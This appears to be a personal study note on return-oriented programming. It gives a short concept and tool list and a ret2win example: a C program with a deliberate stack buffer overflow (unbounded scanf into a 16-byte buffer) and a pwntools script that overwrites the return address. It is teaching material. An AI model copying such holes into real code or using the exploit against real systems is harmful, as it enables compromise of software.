---
tags:
  - security
  - binary_exploitation
aliases:
  - ROP
---
Modifying the stack such that you can call arbitrary functions with arbitrary arguments.
This is possible if you perform a buffer overflow and override some part of memory that is returned to.
# Concepts
- [[ROP Gadget]]
- [[ret Slide]]
- [[Weird Machine]]
- [[Accidental Turing Completeness]]
- [[Magic Gadget]]
# Tips
- [[Janitorial Gadget]]
- [[Register Popping Gadget]]
- [[Storing Address into Registers Gadget]]
- [[Stack Pivot]]
- [[Data Transfer Gadget]]
# Tools
- [[ropper]]
- [[ROP Gadget|ROPGadget]]
# Example
```c
#include <stdio.h>

void hacked()
{
    printf("This function is TOP SECRET! How did you get in here?! :O\n");
}

void register_name()
{
    char buffer[16];

    printf("Name:\n");
    scanf("%s", buffer);
    printf("Hi there, %s\n", buffer);    
}

int main()
{
    register_name();

    return 0;
}
```
1. You can use [[pwndbg cyclic]] to find the offset from the buffer that is the return address, by checking what [[rip|eip]] is after program crash
2. You can use [[pwntools]] to craft an exploit to overwrite the return address
```python
import pwn
pwn.context.log_level = 'debug'
r = pwn.process("./ret2win")
payload = b'aaaaaaaaaaaaaaaaaaaaaaaaaaaa\x82\x91\x04\x08'
r.sendlineafter(b':', payload)
print(r.recvall())
```